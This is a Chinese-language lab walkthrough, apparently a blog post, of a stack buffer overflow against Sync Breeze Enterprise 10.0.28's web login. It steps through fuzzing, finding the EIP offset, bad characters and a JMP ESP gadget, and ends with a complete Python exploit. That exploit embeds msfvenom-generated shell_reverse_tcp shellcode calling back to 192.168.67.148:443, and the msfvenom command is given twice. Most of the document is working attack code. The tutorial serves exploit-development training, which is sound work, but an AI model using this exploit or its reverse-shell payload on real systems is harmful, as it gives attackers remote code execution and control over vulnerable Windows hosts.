## 环境准备

kali虚拟机 [kali-linux-2020.4-vmware-amd64](https://images.kali.org/virtual-images/kali-linux-2020.4-vmware-amd64.7z)

win10虚拟机

漏洞程序 [syncbreezeent_setup_v10.0.28.exe](https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe)

注意，启动后需要在客户端勾选web server选项，并且不要勾选下面两个选项

![](https://image.3001.net/images/20210109/1610163981_5ff9270d47e14cd0628e4.jpg!small)

## 1.编写FUZZ脚本定位漏洞

wireshark抓包

![](https://image.3001.net/images/20210109/1610163816_5ff92668802949de8ba5f.jpg!small)

原教程使用python2基于socket请求，以及靶机上通过immunity debugger观察寄存器以及栈的状态变化来fuzz。

    
    
    #!/usr/bin/python
    # -*- coding: utf-8 -*
    
    import socket
    
    try:
        print "\nSending evil buffer..."
        size = 800
        inputBuffer = "A" * size
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 127.0.0.1\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://127.0.0.1/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("127.0.0.1",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

immunity
debugger下载链接：[ImmunityDebugger_1_85_setup.exe](https://debugger.immunityinc.com/getID.py?hash=2f2ab9ba8aeeae6d8a5d0f76e6bea4da326116ba)

管理员身份运行，attach syncbrs进程后会自动暂停，F9继续运行

执行上面socket_fuzz.py脚本，当发送完800字节的buffer后，debugger进入暂停状态，同时EIP被41414141覆盖。

![](https://image.3001.net/images/20210109/1610169667_5ff93d43ed545ffa67991.jpg!small)

看到有同学尝试通过http请求超时来定位crash时候的buffer大小，回显更友好。

根据机器环境略作修改，http_fuzz.py代码如下：

    
    
    import requests
    
    
    size = 100
    
    while (size < 2000) :
    
        inputbuffer = "A" * size
    
        data = "username=" + inputbuffer + "&password=A"
    
        url = "http://192.168.67.150:80/login"
    
        header = {"Host": "192.168.67.150:80",
                  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                  "Accept-Language": "en-US,en;q=0.5", 
                  "Accept-Encoding": "gzip, deflate",
                  "Referer": "http://192.168.67.150:80/login",
                  "Connection": "close", 
                  "Content-Type": "application/x-www-form-urlencoded",
                  "Content-Length": str(len(data))}
    
        # 构造HTTP 头部
    
        try:
    
            print("Try to send " + str(size))
    
            res = requests.post(url=url, data=data, headers=header,timeout=3)
    
            # 发送请求,以延迟判断端口是否可达.
    
            print("Successful " + str(res.status_code))
    
            size += 100
    
        except Exception as e:
    
            print(e)
    
            print("the program is dead")
    
            break

![](https://image.3001.net/images/20210109/1610170044_5ff93ebcc218e0e0fb77c.jpg!small)个人觉得写fuzz和exp还是通过最原始的socket发送tcp请求交互更好，下文继续使用socket来发送tcp请求

## 2.定位和控制EIP

我们使用800字节的buffer,内容为kali下使用"msf-pattern_create -l 800"生成的每四个字节的chunk均不重复的字符串。

![](https://image.3001.net/images/20210109/1610171010_5ff942824c946c31325fb.jpg!small)

locate_eip.py代码如下:

    
    
    #!/usr/bin/python
    
    import socket
    
    try:
        print "\nSending evil buffer..."
        size = 800
        inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 127.0.0.1\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://127.0.0.1/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("127.0.0.1",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

debugger上定位到eip被42306142覆盖。如下图

![](https://image.3001.net/images/20210109/1610171684_5ff945249c54137bc5c19.jpg!small)

使用kali下的“sf-pattern_offset -l 800 -q 42306142”定位到EIP被覆盖的地址对应的偏移为780.

同时注意到寄存器ESP的值被2Ba3Ba4B...覆盖，在栈中查看ESP存放的数据33614232，对应的偏移为788

![](https://image.3001.net/images/20210109/1610173004_5ff94a4c19f11d3fe58c1.jpg!small)

## 3.定位SHELLCODE的入口位置和分配空间

标准的反弹shell的payload大小大概为350-400字节，于是我们把buffer的大小从800扩大到1500字节。先验证下是否空间大扩大会造成原有的栈溢出环境的改变。代码如下：

    
    
    #!/usr/bin/python
    
    import socket
    
    try:
        print "\nSending evil buffer..."
        size = 800
        filler = "A"*780
        eip = "B"*4
    	offset = "C"*4
        buffer  = "D"*(1500-len(filler)-len(eip)-len(offset))
        inputBuffer = filler + eip + offset + buffer
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 127.0.0.1\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://127.0.0.1/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("127.0.0.1",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

结合寄存器ESP的地址和栈中数值，发现每次栈溢出ESP的地址都不一样，但是指向内容偏移是固定的。也就是说ESP指向的内容，在buffer中的位置是固定的。这个位置可以作为shellcode的起始地址。

![](https://image.3001.net/images/20210109/1610173937_5ff94df17264d3f04633a.jpg!small)

## 4.定位坏字符

缓冲区溢出在构造shellcode前要确定坏字符问题，防止传入的字符串被截断。我们将payload用0x01到0xff共256个16进制数值填充，并反复排查坏字符，知道所有16进制数值都被填充进缓冲区。代码如下：

    
    
    #!/usr/bin/python
    
    import socket
    #"0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D"
    #"\x00\x0a\x0d\x25\x26\x2b\x3d"
    badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
                "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
                "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
                "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
                "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
                "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
                "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
                "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
                "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
                "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
                "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
                "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
                "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
                "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
                "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
                "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    try:
        print "\nSending evil buffer..."
    
        filler = "A"*780
        eip = "B"*4
        offset = "C"*4
        inputBuffer = filler + eip + offset + badchars
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 127.0.0.1\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://127.0.0.1/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("127.0.0.1",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

发送完后，在immunity debugger右键ESP， 选择follow in
dump后查看内存中的这段buffer的值。发现0x0A没有显示，说明它是个坏字符。在脚本里删除0x0A后继续重复这个动作，直到找到所有坏字符。最终坏字符为：0x00,0x0A,0x0D,0x25,0x26,0x3D

## 5.定位指令JMP ESP的可靠内存地址

JMP ESP的选择需要满足两个条件：

一是lib库必须是静态库，避免ASLR的影响，SafeSEH,ASLR,NXCompat(DEP保护)等内存保护技术都是disabled。

二是地址不应该包含坏字符，因为它将会作为我们buffer的一部分。

shellcode可以存放在ESP地址所指向的内存空间，执行完后，程序将会执行ESP所指向的内存空间的代码，也就是我们的shellcode。因此，需要把EIP的值覆盖为JMP
ESP这条指令的地址，JMP ESP对应的opcode为0XFFE4。 通过kali自带的msf-nasm_shell可以获取。

通过immunity debugger的!mona
modules功能可以看到加载的lib库的内存地址，从里面挑选满足以上两个条件的，发现libspp合适。使用!mona find -s "\xff\xe4"
-m "libspp.dll"得到JMP ESP的地址为0x10090c83,如下图所示：

![](https://image.3001.net/images/20210109/1610177277_5ff95afd5d5a6a9a21d97.jpg!small)由于x86和amd64使用的是小端模式，内存中低地址存放低字节，高地址存放高字节。

0x10090c83是一段内存地址，当它作为值写进内存，0x10将会放在高地址，0x83放在低地址，当它被CPU读取到EIP寄存器，CPU先读到0x83,最终读取的地址是反向的。

所以我们应该反向的存储返回地址。

总之一句话，当内存地址作为参数传入给寄存器的时候，要逆序传入。修改eip后的代码如下：

    
    
    #!/usr/bin/python
    
    import socket
    
    try:
        print "\nSending evil buffer..."
        size = 800
        filler = "A"*780
        eip = "\x83\x0c\x09\x10"
        offset = "C"*4
        buffer  = "D"*(1500-len(filler)-len(eip)-len(offset))
        inputBuffer = filler + eip + offset + buffer
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 127.0.0.1\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://127.0.0.1/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("127.0.0.1",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

在debugger的0X10090C83下断点，运行脚本后显示如下：

![](https://image.3001.net/images/20210109/1610181009_5ff96991654477e9bd894.jpg!small)

## 6.生成SHELLCODE并完成exploit

使用kali自带的msfvenom,使用编码器shikata_ta_nai规避坏字符,使用EXITFUNC=thread来避免程序崩溃

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.67.148 LPORT=443
EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

使用10个NOP（0X90）来规避解码器带来的栈顶附近的内存改写。

代码如下：

    
    
    #!/usr/bin/python
    
    import socket
    
    try:
        print "\nSending evil buffer..."
        shellcode = ("\xdd\xc1\xbb\x6b\x94\x1e\xe1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
    "\x52\x31\x5d\x17\x83\xc5\x04\x03\x36\x87\xfc\x14\x34\x4f\x82"
    "\xd7\xc4\x90\xe3\x5e\x21\xa1\x23\x04\x22\x92\x93\x4e\x66\x1f"
    "\x5f\x02\x92\x94\x2d\x8b\x95\x1d\x9b\xed\x98\x9e\xb0\xce\xbb"
    "\x1c\xcb\x02\x1b\x1c\x04\x57\x5a\x59\x79\x9a\x0e\x32\xf5\x09"
    "\xbe\x37\x43\x92\x35\x0b\x45\x92\xaa\xdc\x64\xb3\x7d\x56\x3f"
    "\x13\x7c\xbb\x4b\x1a\x66\xd8\x76\xd4\x1d\x2a\x0c\xe7\xf7\x62"
    "\xed\x44\x36\x4b\x1c\x94\x7f\x6c\xff\xe3\x89\x8e\x82\xf3\x4e"
    "\xec\x58\x71\x54\x56\x2a\x21\xb0\x66\xff\xb4\x33\x64\xb4\xb3"
    "\x1b\x69\x4b\x17\x10\x95\xc0\x96\xf6\x1f\x92\xbc\xd2\x44\x40"
    "\xdc\x43\x21\x27\xe1\x93\x8a\x98\x47\xd8\x27\xcc\xf5\x83\x2f"
    "\x21\x34\x3b\xb0\x2d\x4f\x48\x82\xf2\xfb\xc6\xae\x7b\x22\x11"
    "\xd0\x51\x92\x8d\x2f\x5a\xe3\x84\xeb\x0e\xb3\xbe\xda\x2e\x58"
    "\x3e\xe2\xfa\xcf\x6e\x4c\x55\xb0\xde\x2c\x05\x58\x34\xa3\x7a"
    "\x78\x37\x69\x13\x13\xc2\xfa\xdc\x4c\x8f\x6e\xb4\x8e\x0f\x8e"
    "\xfe\x06\xe9\xfa\x10\x4f\xa2\x92\x89\xca\x38\x02\x55\xc1\x45"
    "\x04\xdd\xe6\xba\xcb\x16\x82\xa8\xbc\xd6\xd9\x92\x6b\xe8\xf7"
    "\xba\xf0\x7b\x9c\x3a\x7e\x60\x0b\x6d\xd7\x56\x42\xfb\xc5\xc1"
    "\xfc\x19\x14\x97\xc7\x99\xc3\x64\xc9\x20\x81\xd1\xed\x32\x5f"
    "\xd9\xa9\x66\x0f\x8c\x67\xd0\xe9\x66\xc6\x8a\xa3\xd5\x80\x5a"
    "\x35\x16\x13\x1c\x3a\x73\xe5\xc0\x8b\x2a\xb0\xff\x24\xbb\x34"
    "\x78\x59\x5b\xba\x53\xd9\x7b\x59\x71\x14\x14\xc4\x10\x95\x79"
    "\xf7\xcf\xda\x87\x74\xe5\xa2\x73\x64\x8c\xa7\x38\x22\x7d\xda"
    "\x51\xc7\x81\x49\x51\xc2")
        size = 800
        filler = "A"*780
        eip = "\x83\x0c\x09\x10"
        offset = "C"*4
        nops = "\x90"*10
        inputBuffer = filler + eip + offset + nops + shellcode
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.67.150\r\n"
        buffer += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        buffer += "Referer: http://192.168.67.150/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " +str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	
        s.connect(("192.168.67.150",80))
        s.send(buffer)
    	
        s.close()
    	
        print "\nDone!"
    
    except Exception as e:
        print "Could not connect!"
        print e

  

成功getshell

![](https://image.3001.net/images/20210109/1610184749_5ff9782dd223894487321.jpg!small)

使用工具总结：

kali:wireshark

windows:immunity debugger

kali:msf-pattern_create,msf-pattern_offset

python:

获取badchars:https://github.com/cytopia/badchars

debugger插件mona:https//github.com/corelan/mona 放到C:\Program Files
(x86)\Immunity Inc\Immunity Debugger\PyCommands下,命令为!mona modules, !mona find
-s "\xff\xe4" -m "libspp.dll"

kali:msf-nasm_shell, msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.67.148 LPORT=443
EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

